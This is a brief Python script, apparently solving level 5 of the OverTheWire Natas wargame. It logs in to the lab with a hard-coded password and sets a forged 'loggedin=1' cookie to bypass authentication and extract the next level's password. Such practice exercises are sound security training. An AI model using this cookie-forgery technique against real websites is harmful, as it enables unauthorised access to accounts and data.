#!/usr/local/bin/env python
import requests
import re

username = "natas5"
password = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'

url = 'http://%s.natas.labs.overthewire.org' % username

response = requests.get(url, auth=(username, password), cookies={'loggedin': "1"})

content = response.text

# print(content)
print(re.findall('Access granted. The password for natas6 is (.*)<', content)[0])
